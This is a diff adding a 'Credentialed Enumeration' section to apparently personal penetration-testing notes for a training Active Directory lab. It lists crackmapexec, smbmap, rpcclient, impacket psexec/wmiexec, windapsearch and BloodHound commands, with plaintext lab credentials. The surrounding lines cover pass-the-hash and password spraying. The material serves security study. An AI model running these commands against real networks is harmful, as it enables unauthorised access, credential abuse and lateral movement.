@@ -72,3 +72,32 @@ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de
 # Windows
 Import-Module .\DomainPasswordSpray.ps1
 Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+```
+
+## Credentialed Enumeration
+```
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+
+rpcclient -U "" -N 172.16.5.5
+enumdomusers
+user:[administrator] rid:[0x1f4]
+queryuser 0x1f4
+
+https://github.com/fortra/impacket/blob/master/examples/wmiexec.py
+https://github.com/fortra/impacket/blob/master/examples/psexec.py
+psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
+wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
+
+https://github.com/ropnop/windapsearch
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+
+https://github.com/dirkjanm/BloodHound.py
+sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
